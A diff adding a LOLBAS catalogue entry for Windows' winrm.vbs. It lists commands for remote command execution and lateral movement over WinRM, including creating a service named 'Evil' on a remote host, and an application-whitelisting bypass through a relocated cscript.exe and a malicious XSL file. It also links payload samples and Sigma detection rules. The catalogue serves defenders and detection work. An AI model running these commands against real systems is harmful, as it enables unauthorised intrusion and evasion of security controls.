@@ -1,0 +1,66 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OSScripts/Winrm.yml -->
+---
+Name: winrm.vbs
+Description: Script used for manage Windows RM settings
+Author: Oddvar Moe
+Created: 2018-05-25
+Commands:
+  - Command: 'winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985'
+    Description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol
+    Usecase: Proxy execution
+    Category: Execute
+    Privileges: User
+    MitreID: T1216
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
+  - Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'
+    Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
+    Usecase: Proxy execution
+    Category: Execute
+    Privileges: Admin
+    MitreID: T1216
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
+  - Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
+    Description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.
+    Usecase: Execute arbitrary, unsigned code via XSL script
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1220
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: XSL
+Full_Path:
+  - Path: C:\Windows\System32\winrm.vbs
+  - Path: C:\Windows\SysWOW64\winrm.vbs
+Code_Sample:
+  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg
+  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
+  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
+Resources:
+  - Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+  - Link: https://www.youtube.com/watch?v=3gz1QmiMhss
+  - Link: https://github.com/enigma0x3/windows-operating-system-archaeology
+  - Link: https://redcanary.com/blog/lateral-movement-winrm-wmi/
+  - Link: https://twitter.com/bohops/status/994405551751815170
+  - Link: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
+  - Link: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
+Acknowledgement:
+  - Person: Matt Graeber
+    Handle: '@mattifestation'
+  - Person: Matt Nelson
+    Handle: '@enigma0x3'
+  - Person: Casey Smith
+    Handle: '@subtee'
+  - Person: Jimmy
+    Handle: '@bohops'
+  - Person: Red Canary Company cc Tony Lambert
+    Handle: '@redcanaryco'
